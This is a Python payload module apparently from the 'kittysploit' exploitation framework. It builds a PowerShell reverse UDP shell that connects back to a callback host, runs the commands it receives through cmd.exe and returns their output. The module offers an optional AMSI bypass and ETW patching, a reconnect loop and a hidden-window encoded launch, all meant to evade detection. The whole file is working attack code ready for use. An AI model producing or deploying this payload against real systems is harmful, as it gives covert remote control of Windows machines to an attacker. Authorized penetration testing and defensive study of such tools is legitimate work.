from kittysploit import *
import base64

from lib.c2.stager_evasion import powershell_prelude


class Module(Payload):

	CLIENT_LANGUAGE = "powershell"

	__info__ = {
		"name": "PowerShell Command Shell, Reverse UDP",
		"description": "Connect-back UDP shell (line-oriented). Pairs with listeners/multi/reverse_udp",
		"category": PayloadCategory.SINGLE,
		"arch": Arch.OTHER,
		"platform": Platform.WINDOWS,
		"listener": "listeners/multi/reverse_udp",
		"handler": Handler.REVERSE,
		"session_type": SessionType.SHELL,
	}

	lhost = OptString("127.0.0.1", "Callback host", True)
	lport = OptPort(4444, "Callback UDP port", True)
	bypass_amsi = OptBool(False, "Prepend AMSI bypass", False, True)
	patch_etw = OptBool(False, "Patch EtwEventWrite", False, True)
	reconnect = OptBool(True, "Reconnect loop after errors", False, True)

	def _build_script(self) -> str:
		host = str(self.lhost)
		port = int(self.lport)
		loop_outer = "while($true){" if bool(self.reconnect) else ""
		loop_close = "Start-Sleep -Seconds 5}" if bool(self.reconnect) else ""

		# Protocol: first datagram registers peer; then each UDP packet is one command line;
		# response is one or more datagrams (chunked) ending with a trailer line "__KS_UDP_END__".
		return f"""
$ErrorActionPreference='SilentlyContinue'
{loop_outer}
try{{
  $udp=New-Object Net.Sockets.UdpClient
  $ep=New-Object Net.IPEndPoint ([Net.IPAddress]::Parse('{host}'), {port})
  $hello=[Text.Encoding]::ASCII.GetBytes("KS_UDP_HELLO`n")
  [void]$udp.Send($hello,$hello.Length,$ep)
  $remote=New-Object Net.IPEndPoint ([Net.IPAddress]::Any,0)
  while($true){{
    $bytes=$udp.Receive([ref]$remote)
    $cmd=[Text.Encoding]::ASCII.GetString($bytes).Trim()
    if(-not $cmd){{ continue }}
    if($cmd -match '^(exit|quit)$'){{ break }}
    try{{
      $out=(cmd.exe /c $cmd 2>&1 | Out-String)
      if(-not $out){{ $out='[empty]`n' }}
    }}catch{{
      $out='ERROR:'+$_.Exception.Message+"`n"
    }}
    $out=$out+"__KS_UDP_END__`n"
    $data=[Text.Encoding]::ASCII.GetBytes($out)
    $ofs=0
    while($ofs -lt $data.Length){{
      $n=[Math]::Min(1200,$data.Length-$ofs)
      $chunk=New-Object byte[] $n
      [Array]::Copy($data,$ofs,$chunk,0,$n)
      [void]$udp.Send($chunk,$chunk.Length,$ep)
      $ofs+=$n
    }}
  }}
  $udp.Close()
}}catch{{}}
{loop_close}
""".strip()

	def generate(self):
		script = powershell_prelude(
			bypass_amsi=bool(self.bypass_amsi),
			patch_etw=bool(self.patch_etw),
		) + self._build_script()
		return self._encode_powershell_command(script, window_style="hidden")
